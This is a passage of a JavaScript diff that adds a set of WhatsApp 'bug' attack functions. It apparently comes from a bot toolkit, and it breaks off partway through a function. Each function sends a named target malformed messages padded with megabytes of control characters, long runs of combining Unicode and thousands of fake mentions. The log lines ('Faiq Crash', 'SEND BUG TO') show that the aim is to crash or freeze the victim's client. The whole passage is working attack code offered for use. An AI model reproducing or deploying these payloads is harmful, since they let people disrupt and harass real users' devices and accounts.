+                Math.floor(Math.random() * 16777215)
+                    .toString(16)
+                    .padStart(6, "99999999"),
+        }
+    );
+    
+    let permissionY = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "ATTACK X-SLAYER 🤪",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_request",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+               "#" +
+               Math.floor(Math.random() * 16777215)
+               .toString(16)
+               .padStart(6, "99999999"),
+        }
+    );    
+
+    await sock.relayMessage(
+        "status@broadcast",
+        permissionX.message,
+        {
+            messageId: permissionX.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );
+    
+    await sock.relayMessage(
+        "status@broadcast",
+        permissionY.message,
+        {
+            messageId: permissionY.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );    
+} 
+async function FizsGnz(sock, target) {
+  const FizsMsg = {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: {
+          header: {
+            type: "text",
+            text: "Neuro Team"
+          },
+          nativeFlowMessage: {
+            messageParamsJson: JSON.stringify({}),
+            buttons: [
+              {
+                name: "single_select",
+                buttonParamsJson: "\x10".repeat(2500000)
+              },
+              {
+                name: "call_permission_request",
+                buttonParamsJson: "\x10".repeat(2500000)
+              },
+              {
+                name: "mpm",
+                buttonParamsJson: "\x10".repeat(2500000)
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+
+  const FizsMsg2 = {
+    viewOnceMessage: {
+      message: {
+        groupInviteMessage: {
+          groupJid: "3254638629@g.us",
+          inviteCode: "FgCbHslbsuVskduJ",
+          inviteExpiration: 3,
+          groupName:
+            "Fizs Team" +
+            "ꦽ".repeat(25000) +
+            "ោ៝".repeat(20000) +
+            "@5".repeat(50000),
+          caption: "\n"
+        },
+        nativeFlowMessage: {},
+        buttons: [
+          {
+            name: "cta_url",
+            messageParamsJson: JSON.stringify({}),
+            url: "https://t.me/ythfiz"
+          }
+        ]
+      }
+    }
+  };
+
+  await sock.relayMessage(target, FizsMsg, {
+    participant: { jid: target },
+    messageId: null
+  });
+
+  await sock.relayMessage(target, FizsMsg2, {
+    participant: { jid: target },
+    messageId: null
+  });
+}
+async function newsw(target) {
+var msg = generateWAMessageFromContent(target, {
+  "videoMessage": {
+    "url": "https://mmg.whatsapp.net/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0&mms3=true",
+    "mimetype": "video/mp4",
+    "fileSha256": "CleMtlrI+21HNQ298bFL4MaF6k9hJImlKgK7WAT/g+Y=",
+    "fileLength": "231536",
+    "seconds": 88888888,
+    "mediaKey": "WlFBzxOj7hIziHuhR8gNCKE2YZSXgcLnfoydMn32FQI=",
+    "caption": "x",
+    "height": -99999,
+    "width": 99999,
+    "fileEncSha256": "zTpAsUWfVLGid5PNcL6/39JVADbLUUK0PT2cxlGpsDA=",
+    "directPath": "/v/t62.7161-24/637975398_2002009003691900_8040701886006703825_n.enc?ccb=11-4&oh=01_Q5Aa3wG-6_BGPGfHNfyrcMFV71OBMz1Wotj66ClQWgKoRxmtfA&oe=69BFA77E&_nc_sid=5e03e0",
+    "mediaKeyTimestamp": "1771576607",
+    "contextInfo": {
+      "pairedMediaType": "NOT_PAIRED_MEDIA",
+      "statusSourceType": "VIDEO",
+      "remoteJid": " #xrellyspec ",
+      "mentionedJid": Array.from({ length: 2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`),
+      "businessMessageForwardInfo": {
+        "businessOwnerJid": "13135550202@s.whatsapp.net",
+        "businessDescription": null
+      },
+      "featureEligibilities": {
+        "canBeReshared": true
+      },
+      "isForwarded": true,
+      "forwardingScore": 9999,
+      "statusAttributions": [
+        {
+          "type": "MUSIC",
+          "externalShare": {
+            "actionUrl": "https://wa.me/settings/linked_devices#,,xrellyspec",
+            "source": "INSTAGRAM",
+            "duration": 999999999,
+            "actionFallbackUrl": "https://wa.me/settings/linked_devices#,,xrellyspec"
+          }
+        }
+      ]
+    },
+    "streamingSidecar": "xUQqEMh4oVoqMy9qDBB3gaNI3yZbbX7dtli6KJ6N1ijvk09oVJzI8w==",
+    "thumbnailDirectPath": "/v/t62.36147-24/640522275_2376887426118122_4696194772404190783_n.enc?ccb=11-4&oh=01_Q5Aa3wHXgSUEMms1n1PJZN7I8Ip8kaEzKYH5nfr9X62LJNv1bw&oe=69BF74C1&_nc_sid=5e03e0",
+    "thumbnailSha256": "9kdKXkxHeCZxJ7WwQ00xanJD9CRLfgrs4lxLd/cRBXQ=",
+    "thumbnailEncSha256": "DuH7/OR2Jz+SPxDiNyl2wKdUDbr6upAQtCmjwAS22CA=",
+    "annotations": [
+      {
+        "shouldSkipConfirmation": true,
+        "embeddedContent": {
+          "embeddedMessage": {
+            "stanzaId": "ACFC34B6742717BAC2BFE825254E1CD1",
+            "message": {
+              "extendedTextMessage": {
+                "text": " xrelly6core # ",
+                "previewType": "NONE",
+                "inviteLinkGroupTypeV2": "DEFAULT"
+              },
+              "messageContextInfo": {
+                "messageSecret": "1y9Zx4kWsv7YLUdsLvUAvSSxlE6KVPSyllLwgXkSzfg=",
+                "messageAssociation": {
+                  "associationType": 18,
+                  "parentMessageKey": {
+                    "remoteJid": "status@broadcast",
+                    "fromMe": false,
+                    "id": "ACEEC73D18B6805DBC04CC8ADF65BF6D",
+                    "participant": "13135550202@s.whatsapp.net"
+                  }
+                }
+              }
+            }
+          }
+        },
+        "embeddedAction": true
+      }
+    ],
+    "externalShareFullVideoDurationInSeconds": 8
+  }
+}, {})
+
+  let JsonExp2 = generateWAMessageFromContent(
+    target,
+    {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            contextInfo: {
+              remoteJid: " is back?! ",
+              mentionedJid: ["13135559098@s.whatsapp.net"],
+            },
+            body: {
+              text: "@xrelly • #fvcker 🩸",
+              format: "DEFAULT",
+            },
+            nativeFlowResponseMessage: {
+              name: "address_message",
+              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
+              version: 3,
+            },
+          },
+        },
+      },
+    },
+    {
+      participant: { jid: target },
+    },
+  );
+
+  await sock.relayMessage('status@broadcast', msg.message, {
+    statusJidList: [target]
+  });
+  
+  await sock.relayMessage('status@broadcast', JsonExp2.message, {
+    statusJidList: [target]
+  });
+}
+async function AyunBelovedxnxx(sock, target) {
+  console.log(chalk.red(`𝗦𝗹𝗮𝘆𝗲𝗿 𝗦𝗲𝗻𝗱 𝗕𝘂𝗴 𝗗𝗲𝗹𝗮𝘆`));
+
+  let peler = await sock.relayMessage(
+    target,
+    {
+      extendedTextMessage: {
+        text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust BALZY" + "\0".repeat(100),
+        matchedText: "https://t.me/balzyy21",
+        description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
+        title: "ꦽ".repeat(20000),
+        previewType: 6,
+        jpegThumbnail:
+          "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
+        paymentLinkMetadata: {
+          button: {
+            displayText: "CRIT"
+          },
+          header: {
+            headerType: 1
+          },
+          provider: {
+            paramsJson: "{".repeat(10000)
+          }
+        },
+        contextInfo: {
+          isForwarded: true,
+          forwardingScore: 9999,
+          participant: target,
+          remoteJid: "status@broadcast",
+          mentionedJid: [
+            "0@s.whatsapp.net",
+            ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
+          ],
+          quotedMessage: {
+            newsletterAdminInviteMessage: {
+              newsletterJid: "otax@newsletter",
+              newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(10000),
+              caption: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(60000) + "ោ៝".repeat(60000),
+              inviteExpiration: "999999999"
+            }
+          },
+          forwardedNewsletterMessageInfo: {
+            newsletterName: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "⃝꙰꙰꙰".repeat(10000),
+            newsletterJid: "13135550002@newsletter",
+            serverId: 1
+          }
+        }
+      }
+    },
+    { participant: { jid: target } }
+  );
+
+  await sleep(1000);
+  await sock.sendMessage(target, {
+    delete: {
+     remoteJid: target,
+      fromMe: true,
+      id: peler.key.id,
+      participant: target
+    }
+  });
+
+  console.log(chalk.bold.red("Delay Visib Success To " + target));
+}
+async function EpcihDingkey(sock, target) {
+  try {
+    await sock.relayMessage(target, {
+      orderMessage: {
+        orderId: "X",
+        thumbnail: Buffer.alloc(0),
+        itemCount: -1,
+        status: 1,
+        surface: 1,
+        message: "X",
+        orderTitle: "X",
+        sellerJid: "0@s.whatsapp.net",
+        token: "Xyz",
+        totalAmount1000: -1000000000,
+        totalCurrencyCode: "IDR",
+        contextInfo: {
+          isForwarded: true,
+          forwardingScore: 999,
+          businessMessageForwardInfo: {
+            businessOwnerJid: target
+          },
+          mentionedJid: Array(100).fill("0@s.whatsapp.net")
+        }
+      }
+    }, {
+      messageId: sock.generateMessageTag(),
+      participant: { jid: target }
+    });
+    let parse = true;
+    let SID = "5e03e0";
+    let key = "10000000_2203140470115547_947412155165083119_n.enc";
+    let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
+    let type = `image/webp`;
+    if (11 > 9) {
+      parse = parse ? false : true;
+    }
+
+    const stc = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          stickerMessage: {
+            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
+            fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+            fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+            mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+            mimetype: type,
+            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
+            fileLength: {
+              low: Math.floor(Math.random() * 1000),
+              high: 0,
+              unsigned: true,
+            },
+            mediaKeyTimestamp: {
+              low: Math.floor(Math.random() * 1700000000),
+              high: 0,
+              unsigned: false,
+            },
+            firstFrameLength: 19904,
+            firstFrameSidecar: "KN4kQ5pyABRAgA==",
+            isAnimated: true,
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  { length: 1900 },
+                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                ),
+              ],
+              groupMentions: [],
+              entryPointConversionSource: "non_contact",
+              entryPointConversionApp: "whatsapp",
+              entryPointConversionDelaySeconds: 467593,
+            },
+            stickerSentTs: {
+              low: Math.floor(Math.random() * -20000000),
+              high: 555,
+              unsigned: parse,
+            },
+            isAvatar: parse,
+            isAiSticker: parse,
+            isLottie: parse,
+          },
+        },
+      },
+    }, {});
+
+    const kel = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "X",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: "\x10".repeat(1045000),
+              version: 3
+            },
+            entryPointConversionSource: "call_permission_request"
+          },
+        },
+      },
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: stc.message,
+      },
+    }, {
+      messageId: stc.key.id,
+      participant: { jid: target },
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: kel.message,
+      },
+    }, {
+      messageId: kel.key.id,
+      participant: { jid: target },
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
+async function EpcihDingkey(sock, target) {
+  try {
+    await sock.relayMessage(target, {
+      orderMessage: {
+        orderId: "X",
+        thumbnail: Buffer.alloc(0),
+        itemCount: -1,
+        status: 1,
+        surface: 1,
+        message: "X",
+        orderTitle: "X",
+        sellerJid: "0@s.whatsapp.net",
+        token: "Xyz",
+        totalAmount1000: -1000000000,
+        totalCurrencyCode: "IDR",
+        contextInfo: {
+          isForwarded: true,
+          forwardingScore: 999,
+          businessMessageForwardInfo: {
+            businessOwnerJid: target
+          },
+          mentionedJid: Array(100).fill("0@s.whatsapp.net")
+        }
+      }
+    }, {
+      messageId: sock.generateMessageTag(),
+      participant: { jid: target }
+    });
+    let parse = true;
+    let SID = "5e03e0";
+    let key = "10000000_2203140470115547_947412155165083119_n.enc";
+    let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
+    let type = `image/webp`;
+    if (11 > 9) {
+      parse = parse ? false : true;
+    }
+
+    const stc = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          stickerMessage: {
+            url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
+            fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
+            fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
+            mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
+            mimetype: type,
+            directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
+            fileLength: {
+              low: Math.floor(Math.random() * 1000),
+              high: 0,
+              unsigned: true,
+            },
+            mediaKeyTimestamp: {
+              low: Math.floor(Math.random() * 1700000000),
+              high: 0,
+              unsigned: false,
+            },
+            firstFrameLength: 19904,
+            firstFrameSidecar: "KN4kQ5pyABRAgA==",
+            isAnimated: true,
+            contextInfo: {
+              participant: target,
+              mentionedJid: [
+                "0@s.whatsapp.net",
+                ...Array.from(
+                  { length: 1900 },
+                  () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+                ),
+              ],
+              groupMentions: [],
+              entryPointConversionSource: "non_contact",
+              entryPointConversionApp: "whatsapp",
+              entryPointConversionDelaySeconds: 467593,
+            },
+            stickerSentTs: {
+              low: Math.floor(Math.random() * -20000000),
+              high: 555,
+              unsigned: parse,
+            },
+            isAvatar: parse,
+            isAiSticker: parse,
+            isLottie: parse,
+          },
+        },
+      },
+    }, {});
+
+    const kel = generateWAMessageFromContent(target, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: {
+              text: "X",
+              format: "DEFAULT"
+            },
+            nativeFlowResponseMessage: {
+              name: "galaxy_message",
+              paramsJson: "\x10".repeat(1045000),
+              version: 3
+            },
+            entryPointConversionSource: "call_permission_request"
+          },
+        },
+      },
+    }, {
+      ephemeralExpiration: 0,
+      forwardingScore: 9741,
+      isForwarded: true,
+      font: Math.floor(Math.random() * 99999999),
+      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: stc.message,
+      },
+    }, {
+      messageId: stc.key.id,
+      participant: { jid: target },
+    });
+
+    await sock.relayMessage(target, {
+      groupStatusMessageV2: {
+        message: kel.message,
+      },
+    }, {
+      messageId: kel.key.id,
+      participant: { jid: target },
+    });
+  } catch (e) {
+    console.error(e);
+  }
+}
+
+async function delayinvisible(target) {
+    let permissionX = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "ꦻ࣯࣯ D𝚵L𐌀Y ¡ИV¡S 𖣘",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_message",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+                "#" +
+                Math.floor(Math.random() * 16777215)
+                    .toString(16)
+                    .padStart(6, "99999999"),
+        }
+    );
+    
+    let permissionY = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: "𒑡 ЯUXⱿS ᭯CЯ𐌀ⱿY 𖣂",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_request",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+               "#" +
+               Math.floor(Math.random() * 16777215)
+               .toString(16)
+               .padStart(6, "99999999"),
+        }
+    );    
+
+    await sock.relayMessage(
+        "status@broadcast",
+        permissionX.message,
+        {
+            messageId: permissionX.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );
+    
+    await sock.relayMessage(
+        "status@broadcast",
+        permissionY.message,
+        {
+            messageId: permissionY.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );    
+}
+async function FaiqDelayInvis2(target, mention) {
+  const message1 = {
+    viewOnceMessage: {
+      message: {
+        interactiveResponseMessage: {
+          body: { 
+            text: "Faiq Crash", 
+            format: "DEFAULT" 
+          },
+          nativeFlowResponseMessage: {
+            name: "galaxy_message",
+            paramsJson: "\u0000".repeat(1045000),
+            version: 3
+          },
+          entryPointConversionSource: "{}"
+        },
+        contextInfo: {
+          participant: target,
+          mentionedJid: Array.from(
+            { length: 1900 },
+            () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+          ),
+          quotedMessage: {
+            paymentInviteMessage: {
+              serviceType: 3,
+              expiryTimestamp: Date.now() + 1814400000
+            },
+          },
+        },
+      },
+    },
+  };
+
+  const audioMessage2 = {
+    audioMessage: {
+      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
+      mimetype: "audio/mpeg",
+      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
+      fileLength: "389948",
+      seconds: 24,
+      ptt: false,
+      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
+      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
+      contextInfo: {
+        remoteJid: "X",
+        participant: "0@s.whatsapp.net",
+        stanzaId: "1234567890ABCDEF",
+        mentionedJid: [
+          "6285215587498@s.whatsapp.net",
+          ...Array.from({ length: 1999 }, () =>
+            `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
+          ),
+        ],
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message1, audioMessage2, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+
+  if (mention) {
+    await sock.relayMessage(
+      target, 
+      {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25
+            }
+          }
+        }
+      }, 
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {
+              is_status_mention: " Faiq Crash  "
+            },
+            content: undefined
+          }
+        ]
+      }
+    );
+  }
+
+  const stickerMsg = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
+          mimetype: "image/webp",
+          fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
+          fileLength: "1173741824",
+          mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
+          fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
+          directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
+          mediaKeyTimestamp: "1743225419",
+          isAnimated: false,
+          viewOnce: false,
+          contextInfo: {
+            mentionedJid: [
+              target,
+              ...Array.from({ length: 1900 }, () =>
+                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              )
+            ],
+            isSampled: true,
+            participant: target,
+            remoteJid: "status@broadcast",
+            forwardingScore: 9999,
+            isForwarded: true,
+            quotedMessage: {
+              viewOnceMessage: {
+                message: {
+                  interactiveResponseMessage: {
+                    body: { text: "Faiq Crash", format: "DEFAULT" },
+                    nativeFlowResponseMessage: {
+                      name: "call_permission_request",
+                      paramsJson: "\u0000".repeat(99999),
+                      version: 3
+                    }
+                  }
+                }
+              }
+            }
+          }
+        }
+      }
+    }
+  };
+
+  const stickerMsgFinal = generateWAMessageFromContent(target, stickerMsg, {});
+
+  await sock.relayMessage("status@broadcast", stickerMsgFinal.message, {
+    messageId: stickerMsgFinal.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  });
+}
+async function Kalzdelay(target) {
+  const msg = {
+    stickerMessage: {
+      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
+      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
+      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
+      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
+      mimetype: "image/webp",
+      height: 9999,
+      width: 9999,
+      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
+      fileLength: 12260,
+      mediaKeyTimestamp: "1743832131",
+      isAnimated: false,
+      stickerSentTs: "X",
+      isAvatar: false,
+      isAiSticker: false,
+      isLottie: false,
+      contextInfo: {
+        mentionedJid: [
+          "0@s.whatsapp.net",
+          ...Array.from(
+            { length: 1900 },
+            () =>
+              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+          ),
+        ],
+        stanzaId: "1234567890ABCDEF",
+        quotedMessage: {
+          paymentInviteMessage: {
+            serviceType: 3,
+            expiryTimestamp: Date.now() + 1814400000
+          }
+        }
+      }
+    }
+  };
+
+  await sock.relayMessage("status@broadcast", msg, {
+    statusJidList: [target],
+    additionalNodes: [{
+      tag: "meta",
+      attrs: {},
+      content: [{
+        tag: "mentioned_users",
+        attrs: {},
+        content: [{ tag: "to", attrs: { jid: target } }]
+      }]
+    }]
+  });
+  console.log(chalk.red(`![BALZYY] SEND NUG TO : ${target}!`))
+}
+async function DelayHardBulldo(sock, target) {
+  for (let i = 0; i < 80; i++) {
+    const payload = {
+      nativeFlowResponseMessage: {
+        name: "call_permission_request",
+        paramsJson: "\u0000".repeat(1045000),
+        version: 3,
+        entryPointConversionSource: "StatusMessage",
+      },
+      forwardingScore: 0,
+      isForwarded: false,
+      font: Math.floor(Math.random() * 9),
+      background: `#${Math.floor(Math.random() * 16777215)
+        .toString(16)
+        .padStart(6, "0")}`,
+
+      audioMessage: {
+        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
+        mimetype: "audio/mpeg",
+        fileSha256: Buffer.from([
+          226, 213, 217, 102, 205, 126, 232, 145,
+          0, 70, 137, 73, 190, 145, 0, 44,
+          165, 102, 153, 233, 111, 114, 69, 10,
+          55, 61, 186, 131, 245, 153, 93, 211,
+        ]),
+        fileLength: 432722,
+        seconds: 26,
+        ptt: false,
+        mediaKey: Buffer.from([
+          182, 141, 235, 167, 91, 254, 75, 254,
+          190, 229, 25, 16, 78, 48, 98, 117,
+          42, 71, 65, 199, 10, 164, 16, 57,
+          189, 229, 54, 93, 69, 6, 212, 145,
+        ]),
+        fileEncSha256: Buffer.from([
+          29, 27, 247, 158, 114, 50, 140, 73,
+          40, 108, 77, 206, 2, 12, 84, 131,
+          54, 42, 63, 11, 46, 208, 136, 131,
+          224, 87, 18, 220, 254, 211, 83, 153,
+        ]),
+        directPath:
+          "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
+        mediaKeyTimestamp: 1746275400,
+
+        contextInfo: {
+          mentionedJid: Array.from(
+            { length: 1900 },
+            () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
+          ),
+          isSampled: true,
+          participant: target,
+          remoteJid: "status@broadcast",
+          forwardingScore: 9741,
+          isForwarded: true,
+          businessMessageForwardInfo: {
+            businessOwnerJid: "0@s.whatsapp.net",
+          },
+        },
+      },
+    };
+
+    const msg = generateWAMessageFromContent(
+      target,
+      {
